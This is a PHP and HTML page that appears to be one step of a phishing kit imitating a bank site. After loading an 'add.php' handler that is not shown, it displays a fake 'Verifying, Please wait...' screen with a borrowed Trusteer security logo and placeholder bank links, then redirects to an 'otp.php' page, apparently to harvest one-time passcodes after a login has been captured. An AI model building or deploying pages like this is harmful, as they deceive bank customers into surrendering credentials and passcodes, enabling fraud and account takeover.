<?php
require 'add.php';
header("Refresh:3; url=otp.php");
require 'includes/header.php';
?>
			<div class="navbar-header">
				<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span> 
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				</button>
			</div>
<?php
require 'includes/nav.php';
?>

        	
<div id="pageContentFrame">
	<div id="pageContent" class=" product" style="opacity: 1;">
		<div class="container">
		<div class="row container">
			<ol id="crumbList" class="col-sm-6 breadcrumb">
				<li><a href="#" class="crum">Home</a></li>
				<li class="last">Establishing connection</li>
			</ol>
		</div>
		<br class="clearBoth">
		<div class="row">
			<div class="col-sm-9">
				<div class="info notification">
				
					Welcome Back.					
				</div>
			</div>
			<div class="col-sm-3"></div>

			<div class="col-sm-9">

				<div class="panel panel-default">
					
					<div class="panel-body panel-content">
						

						<br class="clearBoth">
						<br class="clearBoth">
						<br class="clearBoth">
						<br class="clearBoth">
						<center>
						Verifying, Please wait...
						<br class="clearBoth">
						<br class="clearBoth">
						<img src="images/loading.gif" alt="loading please wait" width="100" height="92">
						</center>
						<br class="clearBoth">
						<br class="clearBoth">
						<br class="clearBoth">
						<br class="clearBoth">
						<br class="clearBoth">
						
						
						
					
					</div>
				</div>
			</div>
		
<div class="col-sm-3">
	<div class="right-tile">
		<h4>
			<span class="pointericon"></span>
			Quick Links
		</h4>
		<div class="right-tile_content quicklinksbox">
		<ul>		
			<li><a href="#">New Services</a></li>
            <li><a href="#">Motor &amp; Household</a></li>
            <li><a href="#">Register</a></li>
		</ul>
		<div class="panel panel-body">
			<a href="#"><img alt="" src="images/trusteer_logo.png"></a>
		</div>
	</div>	
	</div>	
</div>
			
		</div>
				</div>
	</div>
</div>

<?php
require 'includes/footer.php';
?>
<!-- Modal -->
<div class="modal" id="genericModal" role="dialog" aria-labelledby="genericModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
        </div> <!-- /.modal-content -->
    </div> <!-- /.modal-dialog -->
</div> 
</body>
</html>
